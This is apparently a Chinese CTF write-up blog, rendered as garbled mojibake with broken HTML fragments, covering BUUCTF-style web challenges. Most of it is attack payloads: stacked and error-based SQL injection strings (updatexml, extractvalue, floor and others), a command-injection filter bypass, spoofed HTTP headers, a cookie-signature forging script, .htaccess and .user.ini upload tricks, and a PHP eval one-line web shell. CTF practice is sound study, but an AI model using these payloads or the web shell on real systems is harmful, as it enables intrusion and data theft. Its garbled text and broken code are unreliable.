é¦–å…ˆè¿™é‡Œçš„queryå‚æ•°æ— è®ºæˆ‘ä»¬è¾“å…¥æ•°å­—ä»€ä¹ˆéƒ½åªä¼šå›æ˜¾Array([0]= > 1)ï¼Œè¾“å…¥å­—æ¯ä¸ä¼šæ˜¾ï¼Œä½†æ˜¯ä¹Ÿæ²¡æ˜¾ç¤ºæ˜¯è¿‡æ»¤çš„ï¼Œæ‰€ä»¥queryçš„å€¼å¦‚æœä¸ºéæ•°å­—åˆ™æ— æ³•æ­£ç¡®æŸ¥è¯¢å¾—åˆ°æ•°æ®å›æ˜¾ï¼Œé‚£ä¹ˆæŸ¥è¯¢è¯­å¥å°±åº”è¯¥é•¿è¿™æ ·

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

1.`||`åœ¨SQLè¯­å¥ä¸­è¡¨ç¤º`æˆ–`ï¼Œåœ¨æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå†…å®¹æ—¶ï¼Œé€—å·`,`ç”¨äºæŸ¥è¯¢å¤šä¸ªå­—æ®µå  *,1

2.é€šè¿‡ä¿®æ”¹SQLé…ç½®å°†æˆ–è¿ç®—ç¬¦`||`è®¾ç½®ä¸ºè¿æ¥ç¬¦ 

payload

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="built_in">set</span> sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>

è¿™æ ·æ‹¼æ¥å¾—åˆ°çš„è¯­å¥å°±åº”è¯¥æ˜¯

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="number">1</span>;set sql_mode=PIPES_AS_CONCAT;select <span class="number">1</span>||flag <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>

#### [GXYCTF2019]Ping Ping Ping

###### /?ip=127.0.0.1;cat$IFS$1index.php æ‰¾åˆ°index.phpè¿‡æ»¤åŸåˆ™

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">    die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">    die(&quot;fxck your flag!&quot;);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span></span><br><span class="line"><span class="string">  echo &quot;</span></span><br><span class="line"><span class="string">&quot;;</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

###### å‘ç°æœ‰$aå˜é‡ï¼Œç›´æ¥è¦†ç›–

?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php å³å¯å¾—åˆ°flag

#### [æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL

0â€˜ union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA# å¾—åˆ°information_schema

0â€™ union select 1,2,(select group_concat(SCHEMA_NAME)from information_schema.SCHEMATA)#  å¾—åˆ°information_schema,mysql,performance_schema,test,geek

0â€™ union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=â€™geekâ€™)# å¾—åˆ°geekuser,l0ve1ysq1  

0â€™ union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=â€™geekâ€™ and table_name=â€™l0ve1ysq1â€™)#  å¾—åˆ°id,username,password

0â€™ union select 1,2,group_concat(id,username,password) from l0ve1ysq1# å³å¯å¾—åˆ°flag

####  [æå®¢å¤§æŒ‘æˆ˜ 2019]Knife

èšå‰‘è¿æ¥å¯†ç Sycï¼Œå³å¯å¾—åˆ°flag

#### [æå®¢å¤§æŒ‘æˆ˜ 2019]Http

æºä»£ç å‘ç°

<a style="border:none;cursor:default;" onclick="return false" href="Secret.php">

å‘ç°Secret.php,å¢åŠ ä»¥ä¸‹å†…å®¹å³å¯å¾—åˆ°flagã€‚

User-Agent: Syclover

Referer: https://Sycsecret.buuoj.cn
x-forwarded-for: 127.0.0.1

#### [æŠ¤ç½‘æ¯ 2018]easy_tornado

1./hints.txt
md5(cookie_secret+md5(filename))

2.[tornado.web â€” RequestHandler and Application classes â€” Tornado 6.1 documentation (tornadoweb.org)](https://www.tornadoweb.org/en/stable/web.html#tornado.web.Application.settings)  å¯ä»¥

æ„é€ error?msg= å¯ä»¥å¾—åˆ°{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '32f7e2e8-717a-4480-b1a3-18fee69c861c'}

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stringtomd5</span>(<span class="params">originstr</span>):</span></span><br><span class="line">    signaturemd5=hashlib.md5()</span><br><span class="line">    signaturemd5.update(originstr)</span><br><span class="line">    <span class="keyword">return</span> signaturemd5.hexdigest()</span><br><span class="line">m=stringtomd5(<span class="string">&quot;/fllllllllllllag&quot;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">n=<span class="string">&#x27;32f7e2e8-717a-4480-b1a3-18fee69c861c&#x27;</span>+m</span><br><span class="line"><span class="built_in">print</span>(stringtomd5(n.encode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br></pre></td></tr></table></figure>

æ„é€ /file?filename=/fllllllllllllag&filehash=2af1ac947c22676b95cea1748cb1ab3c å³å¯è·å¾—flag

hintsæç¤º`render`ï¼ˆè¯¦æƒ…è¯·çœ‹[renderå‡½æ•°ä»‹ç»ï¼Œä»¥åŠ render: h => h(App)](https://blog.csdn.net/qq78827534/article/details/80792514)ï¼‰

#### [æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL

æŠ¥é”™æ³¨å…¥

##### **æŠ¥é”™æ³¨å…¥åŸç†è¯¦è§£**

å¾€å¾€åœ¨æ³¨å…¥è¿‡ç¨‹ä¸­æ ¹æ®é”™è¯¯å›æ˜¾è¿›è¡Œåˆ¤æ–­ï¼Œä½†æ˜¯ç°åœ¨éå¸¸å¤šçš„Webç¨‹åºæ²¡æœ‰æ­£å¸¸çš„é”™è¯¯å›æ˜¾ï¼Œè¿™æ ·å°±éœ€è¦æˆ‘ä»¬åˆ©ç”¨æŠ¥é”™æ³¨å…¥çš„æ–¹å¼æ¥è¿›è¡ŒSQLæ³¨å…¥äº†ã€‚è¿™ç¯‡æ–‡ç« ä¼šè®²è§£ä¸€ä¸‹æŠ¥é”™æ³¨å…¥çš„äº§ç”ŸåŸç†å’Œåˆ©ç”¨æ¡ˆä¾‹ã€‚

å½“åœ¨â¼€ä¸ªèšåˆå‡½æ•°ï¼Œâ½å¦‚`count`å‡½æ•°åâ¾¯å¦‚æœä½¿â½¤åˆ†ç»„è¯­å¥å°±ä¼šæŠŠæŸ¥è¯¢çš„â¼€éƒ¨åˆ†ä»¥é”™è¯¯çš„å½¢å¼æ˜¾â½°å‡ºæ¥ã€‚è¿™äº›å‡½æ•°åˆ†åˆ«æ˜¯ï¼š

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rand() <span class="comment">//éšæœºå‡½æ•° </span></span><br><span class="line">Floor() <span class="comment">//å–æ•´å‡½æ•° </span></span><br><span class="line">Count() <span class="comment">//èšåˆå‡½æ•° </span></span><br><span class="line">Group by key <span class="comment">//åˆ†ç»„è¯­å¥</span></span><br></pre></td></tr></table></figure>

å¤åˆ¶

ä¾‹å¦‚ï¼Œåˆ©â½¤`floor()`è¯­å¥æŠ¥é”™ï¼Œæ˜¯åˆ©â½¤`floor()`,`count()`,`group() by`å†²çªæŠ¥é”™ï¼Œå½“è¿™ä¸‰ä¸ªå‡½æ•°åœ¨ç‰¹å®šæƒ…å†µâ¼€èµ·ä½¿â½¤äº§â½£çš„ é”™è¯¯ã€‚

`extractvalue`æ³¨â¼Šçš„åŸç†ï¼šä¾æ—§å¦‚åŒ`updatexml`â¼€æ ·ï¼Œ`extract`çš„ç¬¬â¼†ä¸ªå‚æ•°è¦æ±‚æ˜¯`xpath`æ ¼å¼å­—ç¬¦ä¸²ï¼Œâ½½æˆ‘ä»¬è¾“â¼Šçš„å¹¶ä¸æ˜¯ã€‚æ‰€ä»¥æŠ¥é”™ã€‚

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å‡½æ•°è§£é‡Šï¼š ã€€ã€€extractvalue()ï¼šä»â½¬æ ‡XMLä¸­è¿”å›åŒ…å«æ‰€æŸ¥è¯¢å€¼çš„å­—ç¬¦ä¸²ã€‚ã€€ã€€</span><br><span class="line">EXTRACTVALUE (XML_document, XPath_string); ã€€ã€€</span><br><span class="line">ç¬¬â¼€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯<span class="built_in">String</span>æ ¼å¼ï¼Œä¸ºXMLâ½‚æ¡£å¯¹è±¡çš„åç§°ï¼Œâ½‚ä¸­ä¸ºDoc ã€€ã€€</span><br><span class="line">ç¬¬â¼†ä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ã€€ã€€</span><br><span class="line"><span class="attr">oncat</span>:è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§â½£çš„å­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure>

å¤åˆ¶

##### **æŠ¥é”™æ³¨â¼Šå¸¸â½¤çš„å‡½æ•°**

è¿‡æ»¤äº†ç©ºæ ¼ï¼Œselect, =

1ï¼šç©ºæ ¼è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨/**/æˆ–è€…()ç»•è¿‡
2ï¼š=å·è¢«è¿‡æ»¤å¯ä»¥ç”¨likeæ¥ç»•è¿‡
3ï¼šsubstringä¸midè¢«è¿‡æ»¤å¯ä»¥ç”¨rightä¸leftæ¥ç»•è¿‡

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>floor() </span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat(user(),floor(rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>extractvalue() </span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and (extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>updatexml()</span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>geometrycollection()</span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and geometrycollection((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>multipoint()</span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and multipoint((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span>polygon() </span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and polygon((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>multipolygon() </span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and multipolygon((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>linestring() </span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and linestring((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span>multilinestring() </span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and multilinestring((select * <span class="keyword">from</span>(select * <span class="keyword">from</span>(select user())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span>exp() </span><br><span class="line">select * <span class="keyword">from</span> test where id=<span class="number">1</span> and exp(~(select * <span class="keyword">from</span>(select user())a));</span><br></pre></td></tr></table></figure>

1'or(updatexml(1,concat(0x7e,(select(user())),0x7e),1))# å¾—åˆ°'~root@localhost~'

admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))# å¾—åˆ°~geek~

admin'or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like('geek')),0x7e),1))# å¾—åˆ°'~H4rDsq1~'

admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#  å¾—åˆ°id,username,password

admin'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e),1))# å¾—åˆ°1flagflag{ab8d5d30-5b84-4e93-83

admin'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))# å¾—åˆ°flag{ab8d5d30-5b84-4e93-83d5-67

admin'or(updatexml(1,concat(0x7e,(select(right(password,20))from(H4rDsq1)),0x7e),1))# å¾—åˆ°3-83d5-6748b6a2cd96}

æ‰€ä»¥å®Œæ•´çš„flagæ˜¯{ab8d5d30-5b84-4e93-83d5-6748b6a2cd96}

#### [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢

#### å®éªŒç¯å¢ƒ

- PHPstudy
- php5.6ä»¥ä¸‹ä¸å¸¦ntsçš„ç‰ˆæœ¬  è¯¥é¢˜ç›®ç¯å¢ƒ**PHP Version **PHP/5.6.23
- upload-labs-masterä¸Šä¼ æ¼æ´é¶åœº
- æœåŠ¡å™¨æ²¡æœ‰ç¦æ­¢.htaccessæ–‡ä»¶çš„ä¸Šä¼ ï¼Œä¸”æœåŠ¡å•†å…è®¸ç”¨æˆ·ä½¿ç”¨è‡ªå®šä¹‰.htaccessæ–‡ä»¶

##### .htaccessæ–‡ä»¶ä¸Šä¼ æ¼æ´

åŸç†ï¼š.htaccessæ–‡ä»¶(æˆ–è€…"åˆ†å¸ƒå¼é…ç½®æ–‡ä»¶"ï¼‰,å…¨ç§°æ˜¯Hypertext Access(è¶…æ–‡æœ¬å…¥å£)ã€‚æä¾›äº†é’ˆå¯¹ç›®å½•æ”¹å˜é…ç½®çš„æ–¹æ³•ï¼Œ å³ï¼Œåœ¨ä¸€ä¸ªç‰¹å®šçš„æ–‡æ¡£ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæŒ‡ä»¤çš„æ–‡ä»¶ï¼Œ ä»¥ä½œç”¨äºæ­¤ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ã€‚ä½œä¸ºç”¨æˆ·ï¼Œæ‰€èƒ½ä½¿ç”¨çš„å‘½ä»¤å—åˆ°é™åˆ¶ã€‚ç®¡ç†å‘˜å¯ä»¥é€šè¿‡Apacheçš„AllowOverrideæŒ‡ä»¤æ¥è®¾ç½®ã€‚
.htaccessæ–‡ä»¶å†…å®¹
.htaccessæ–‡ä»¶è§£æè§„åˆ™çš„å¢åŠ ï¼Œæ˜¯å¯ä»¥æŒ‰ç…§ç»„åˆçš„æ–¹å¼å»åšçš„ï¼Œä¸è¿‡å…·ä½“å¾—è‡ªå·±å¤šæµ‹è¯•ã€‚

ç¬¬ä¸€ç§ã€è™½ç„¶å¥½ç”¨ï¼Œä½†æ˜¯ä¼šè¯¯ä¼¤å…¶ä»–æ­£å¸¸æ–‡ä»¶ï¼Œå®¹æ˜“è¢«å‘ç°

<IfModule mime_module>
AddHandler php5-script .gif          #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œåªé’ˆå¯¹gifæ–‡ä»¶ä¼šè§£ææˆPhpä»£ç æ‰§è¡Œ
SetHandler application/x-httpd-php    #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä¼šè¢«è§£ææˆphpä»£ç æ‰§è¡Œ
</IfModule>
ç¬¬äºŒç§ã€ç²¾ç¡®æ§åˆ¶èƒ½è¢«è§£ææˆphpä»£ç çš„æ–‡ä»¶ï¼Œä¸å®¹æ˜“è¢«å‘ç°

<FilesMatch "evil.gif">
SetHandler application/x-httpd-php   #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ
AddHandler php5-script .gif          #åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œå¦‚æœåŒ¹é…åˆ°evil.gifæ–‡ä»¶ï¼Œåˆ™è¢«è§£ææˆPHPä»£ç æ‰§è¡Œ
</FilesMatch>
ç¬¬ä¸‰ç§ã€åŒ1æ²¡å¤ªå¤§åŒºåˆ«

<IfModule mime_module>
AddType application/x-httpd-php .gif
</IfModule>
åˆ©ç”¨æ–¹å¼ï¼šä¸Šä¼ è¦†ç›–.htaccessæ–‡ä»¶ï¼Œé‡å†™è§£æè§„åˆ™ï¼Œå°†ä¸Šä¼ çš„å¸¦æœ‰è„šæœ¬é©¬çš„å›¾ç‰‡ä»¥è„šæœ¬æ–¹å¼è§£æã€‚
ä¸Šä¼ ä¹‹åå°±å¯ä»¥å°†jpgå½“æˆphpæ–‡ä»¶æ‰§è¡Œã€‚

åœ¨ä¸Šä¼ <?php @eval($_POST['shell']);?><p>  æ–‡ä»¶å1.jpg,åœ¨èšå‰‘è¿æ¥ï¼Œå°±å¯ä»¥è·å¾—flagã€‚</p>
<p>index.phpæºç ï¼š</p>
<?php
session_start();
echo "

<meta charset=\"utf-8\">
<title>æ˜¯å…„å¼Ÿå°±æ¥ä¼ ğŸ</title>
<a><img src="\"https://s1.ax1x.com/2020/03/13/8KBOlq.jpg\"" alt="\"8KBOlq.jpg\"" border="\"0\""></a>
<a><img src="\"https://s1.ax1x.com/2020/03/13/8KcVoT.md.jpg\"" alt="\"8KcVoT.jpg\"" border="\"0\""></a>
<form action="\"upload.php\"" method="\"post\"" enctype="\"multipart/form-data\"">
<input type="\"file\"" name="\"uploaded\"">
<br>
<input type="\"submit\"" name="\"submit\"" value="\"ä¸€é”®å»ä¸–\"">
</form>";
if(!isset($_SESSION['user'])){
    $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000));
}
?>


<p>upload.phpæºä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br></pre></td></tr></table></figure>



<meta charset="\"utf-8\"">";
if(!isset($_SESSION['user'])){
    $_SESSION['user'] = md5((string)time() . (string)rand(100, 1000));
}
if(isset($_FILES['uploaded'])) {
    $target_path  = getcwd() . "/upload/" . md5($_SESSION['user']);
    $t_path = $target_path . "/" . basename($_FILES['uploaded']['name']);
    $uploaded_name = $_FILES['uploaded']['name'];  //æ•´ä¸ªæ–‡ä»¶å+åç¼€
    $uploaded_ext  = substr($uploaded_name, strrpos($uploaded_name,'.') + 1); //å–.åé¢ç±»å‹
    $uploaded_size = $_FILES['uploaded']['size'];
    $uploaded_tmp  = $_FILES['uploaded']['tmp_name'];  //æ–‡ä»¶è¢«ä¸Šä¼ ååœ¨æœåŠ¡ç«¯å‚¨å­˜çš„ä¸´æ—¶æ–‡ä»¶å



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/ph/i&quot;</span>, strtolower(<span class="variable">$uploaded_ext</span>)))&#123; <span class="comment">//å‰ä¸¤ä¸ªå­—æ¯æ˜¯phå°±è¿‡æ»¤ï¼Œä¸ç®¡å¤§å°å†™</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">        &quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)|| (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">        <span class="variable">$content</span> = file_get_contents(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">		mkdir(iconv(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$target_path</span>), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		move_uploaded_file(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æˆ‘æ‰Œyour problem?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>}<br>?&gt;</p>
<h4 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h4><p>åˆ©ç”¨.user.iniä¸Šä¼ \éšè—åé—¨<br>.user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰é™¤äº†PHP_INI_SYSTEMä»¥å¤–çš„æ¨¡å¼ï¼Œåœ¨æ‰§è¡Œphpä»£ç ä¹‹å‰ï¼Œç³»ç»Ÿä¼šå¯¹.user.iniå…ˆåšä¸€ä¸ªæ‰§è¡Œï¼Œç„¶åæ‰æ‰§è¡Œå…¶ä»–çš„phpæ–‡ä»¶ã€‚</p>
<p>åˆ©ç”¨.user,iniå…ˆæ‰§è¡Œauto_prepend_fileå‡½æ•°ï¼Œauto_prepend_fileè¡¨ç¤ºåœ¨phpç¨‹åºåŠ è½½ç¬¬ä¸€ä¸ªphpä»£ç å‰åŠ è½½çš„phpæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯å…ˆåŠ è½½äº†a.jpgé‡Œé¢çš„æ–‡ä»¶ï¼Œå³ä¸€å¥è¯æœ¨é©¬ã€‚</p>
<p>ä½¿ç”¨æ¡ä»¶ï¼š<br>(1)æœåŠ¡å™¨è„šæœ¬è¯­è¨€ä¸ºPHP<br>(2)å¯¹åº”ç›®å½•ä¸‹é¢æœ‰å¯æ‰§è¡Œçš„phpæ–‡ä»¶<br>(3)æœåŠ¡å™¨ä½¿ç”¨CGIï¼FastCGIæ¨¡å¼</p>
<p>å‚è€ƒé“¾æ¥ï¼šæ·»åŠ é“¾æ¥æè¿°</p>
<p>ç»•è¿‡exif_imagetype()<br>åˆ©ç”¨GIF89aæ–‡ä»¶å¤´ç»•è¿‡</p>
<p>index.phpæºä»£ç </p>
<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Upload Labs</title>
</head>

<body>
    <h2>Upload Labs</h2>
    <form action="index.php" method="post" enctype="multipart/form-data">
        <label for="file">æ–‡ä»¶åï¼š</label>
        <input type="file" name="fileUpload" id="file"><br>
        <input type="submit" name="upload" value="æäº¤">
    </form>
</body>

</html>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="variable">$userdir</span> = <span class="string">&quot;uploads/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!file_exists(<span class="variable">$userdir</span>)) &#123;</span><br><span class="line">    mkdir(<span class="variable">$userdir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents(<span class="variable">$userdir</span> . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;upload&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$tmp_name</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);</span><br><span class="line">    